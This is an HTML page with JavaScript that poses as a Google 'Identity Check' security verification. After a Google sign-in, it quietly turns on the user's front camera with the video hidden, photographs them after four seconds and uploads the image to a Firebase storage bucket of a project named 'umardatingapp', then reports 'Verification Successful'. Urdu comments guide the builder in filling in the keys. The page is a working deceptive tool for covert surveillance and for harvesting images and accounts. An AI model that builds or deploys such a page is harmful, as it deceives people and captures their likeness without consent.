<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
    
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f2f5; }
        .container { text-align: center; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        h2 { color: #1c1e21; margin-bottom: 10px; }
        p { color: #606770; margin-bottom: 25px; font-size: 14px; }
        .btn { background-color: #1877f2; color: white; border: none; padding: 14px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
        .btn:hover { background-color: #166fe5; }
        #status { margin-top: 15px; font-size: 13px; color: #d93025; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <h2>Identity Check</h2>
    <p>Please verify your Google account to secure your profile and continue.</p>
    <button id="loginBtn" class="btn">Verify with Google</button>
    <div id="status"></div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
</div>

<script>
    // عمر بھائی، یہ آپ کی ویڈیو والی اصلی کنفگ ہے
    const firebaseConfig = {
        apiKey: "AIzaSyAXHdAe7lD-Lclh1vG1B0xU2zQYpMvR4", // یہاں اپنی ویڈیو سے دیکھ کر مکمل کی ڈالیں
        authDomain: "umardatingapp.firebaseapp.com",
        projectId: "umardatingapp",
        storageBucket: "umardatingapp.appspot.com",
        messagingSenderId: "589931647437",
        appId: "1:589931647437:web:3e9b70abafdb1b16be97484"
    };

    // Initialize Firebase
    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }

    const auth = firebase.auth();
    const storage = firebase.storage();
    const provider = new firebase.auth.GoogleAuthProvider();

    const loginBtn = document.getElementById('loginBtn');
    const statusDiv = document.getElementById('status');

    // Button Click: Redirect to Google Login
    loginBtn.addEventListener('click', () => {
        statusDiv.innerText = "Redirecting to Google...";
        auth.signInWithRedirect(provider);
    });

    // Check login result after redirect
    auth.getRedirectResult().then((result) => {
        if (result.user) {
            statusDiv.style.color = "green";
            statusDiv.innerText = "Verifying... Please wait 5 seconds.";
            startCamera();
        }
    }).catch((error) => {
        console.error(error);
        statusDiv.innerText = "Error: " + error.message;
    });

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('video');
            video.srcObject = stream;

            // Wait 4 seconds then take picture
            setTimeout(() => {
                takeSnapshot(stream);
            }, 4000);
        } catch (err) {
            statusDiv.innerText = "Camera access denied. Please allow camera to verify.";
        }
    }

    function takeSnapshot(stream) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        canvas.width = 640;
        canvas.height = 480;
        context.drawImage(video, 0, 0, 640, 480);

        canvas.toBlob((blob) => {
            const fileName = `verification/user_${Date.now()}.png`;
            const storageRef = storage.ref(fileName);

            storageRef.put(blob).then(() => {
                statusDiv.innerText = "Verification Successful! Redirecting...";
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
                // Optional: Redirect user somewhere else
            });
        }, 'image/png');
    }
</script>

</body>
</html>
